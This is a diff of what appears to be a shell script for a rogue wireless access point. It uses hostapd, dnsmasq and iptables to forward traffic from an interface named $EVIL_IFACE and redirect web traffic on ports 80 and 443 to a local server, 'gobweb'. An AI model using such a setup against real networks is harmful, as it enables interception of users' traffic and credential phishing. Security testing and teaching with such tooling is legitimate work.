@@ -39,7 +39,7 @@ iptables -N GOBWEB -t nat
 
 iptables -t nat -A PREROUTING -j GOBWEB
 iptables -t nat -A GOBWEB -p tcp -j DNAT --dport 80 --to-destination 192.168.1.1:80
-iptables -t nat -A GOBWEB -p udp -j DNAT --dport 80 --to-destination 192.168.1.1:80
+iptables -t nat -A GOBWEB -p tcp -j DNAT --dport 443 --to-destination 192.168.1.1:80
 
 iptables -t filter -A FORWARD -i $EVIL_IFACE -o $GOOD_IFACE -j ACCEPT
 iptables -t nat -A POSTROUTING -o $GOOD_IFACE -j MASQUERADE
@@ -65,6 +65,5 @@ go run gobweb.go &
 hostapd hostapd.conf
 
 killall dnsmasq
-killall gobweb
 
 sysctl net.ipv4.ip_forward=0
